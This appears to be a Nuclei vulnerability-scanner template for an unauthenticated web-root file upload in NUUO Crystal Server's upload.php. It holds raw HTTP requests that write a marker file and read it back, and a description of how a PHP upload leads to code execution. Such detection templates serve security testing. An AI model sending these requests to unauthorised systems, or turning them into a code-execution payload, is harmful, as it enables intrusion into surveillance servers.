id: nuuo-crystal-server-unauth-file-upload

info:
  name: NUUO Crystal Server - Unauthenticated Web-Root File Upload
  author: Exploit-Garbage
  severity: critical
  description: |
    NUUO Crystal Server 3.19.0.85 contains an unauthenticated file upload
    vulnerability in upload.php. The three-line handler calls copy() with the
    client-supplied multipart filename as the destination and performs no
    session check, extension filtering, MIME inspection or path validation, so
    an anonymous request writes an attacker-chosen file into the served
    document root. Uploading a PHP file leads to remote code execution under
    the product's PHP service account through the lighttpd fastcgi mapping.
  reference:
    - https://0day-rubbish.com/blog/nuuo-crystal-server-unauth-upload-php-webroot-write-rce
    - https://github.com/Exploit-Garbage/0day-Rubbish
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
  metadata:
    max-request: 2
  tags: nuuo,upload,fileupload,rce,unauth,vrm,cctv

# The verification is intentionally non-executing: it uploads a plain text
# marker file to the vulnerable endpoint and fetches it back from the web
# root. A successful fetch proves the unauthenticated arbitrary web-root
# write primitive; no PHP payload is ever requested or executed.

http:
  - raw:
      - |
        POST /upload.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----nucleiupload

        ------nucleiupload
        Content-Disposition: form-data; name="userfile"; filename="{{randstr}}.txt"
        Content-Type: text/plain

        {{randstr}}
        ------nucleiupload--
      - |
        GET /{{randstr}}.txt HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{randstr}}"

      - type: status
        status:
          - 200
